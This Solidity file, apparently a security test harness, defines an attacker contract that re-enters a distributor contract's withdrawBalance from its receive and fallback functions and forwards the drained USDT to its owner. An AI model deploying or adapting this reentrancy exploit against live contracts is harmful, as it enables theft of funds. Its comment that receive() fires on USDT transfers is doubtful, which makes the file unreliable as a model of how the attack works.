// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDistributer {
    function withdrawBalance(uint256 amount) external;
    function getBalance(address role) external view returns (uint256);
}

/**
 * @title AttackerContract
 * @dev A malicious contract that attempts to perform a reentrancy attack on the DistributerContract
 */
contract AttackerContract {
    IDistributer public distributerContract;
    IERC20 public usdtToken;
    address public owner;
    uint256 public attackCount;
    
    event AttackLog(string message, uint256 amount);
    
    constructor(address _distributerContract, address _usdtToken) {
        distributerContract = IDistributer(_distributerContract);
        usdtToken = IERC20(_usdtToken);
        owner = msg.sender;
        attackCount = 0;
    }
    
    // Function to start the attack
    function attack(uint256 amount) external {
        require(msg.sender == owner, "Only owner can initiate attack");
        
        // Check if we have a balance in the distributerContract
        uint256 balance = distributerContract.getBalance(address(this));
        require(balance >= amount, "Insufficient balance in distributerContract");
        
        // Start the attack
        attackCount = 0;
        distributerContract.withdrawBalance(amount);
    }
    
    // This function will be called when the distributerContract sends USDT to this contract
    receive() external payable {
        // This is where the reentrancy would happen
        attackReentrancy();
    }
    
    // Fallback function to handle token transfers
    fallback() external payable {
        // This is where the reentrancy would happen
        attackReentrancy();
    }
    
    // Function to attempt reentrancy
    function attackReentrancy() internal {
        // Limit attack attempts to prevent infinite loops during testing
        if (attackCount < 3) {
            attackCount++;
            
            uint256 balance = distributerContract.getBalance(address(this));
            if (balance > 0) {
                emit AttackLog("Attempting reentrancy attack", balance);
                
                // Try to withdraw again before the first withdrawal completes
                distributerContract.withdrawBalance(balance);
            }
        }
    }
    
    // Function to withdraw USDT from this contract
    function withdrawUSDT() external {
        require(msg.sender == owner, "Only owner can withdraw");
        
        uint256 balance = usdtToken.balanceOf(address(this));
        require(balance > 0, "No USDT to withdraw");
        
        usdtToken.transfer(owner, balance);
    }
} 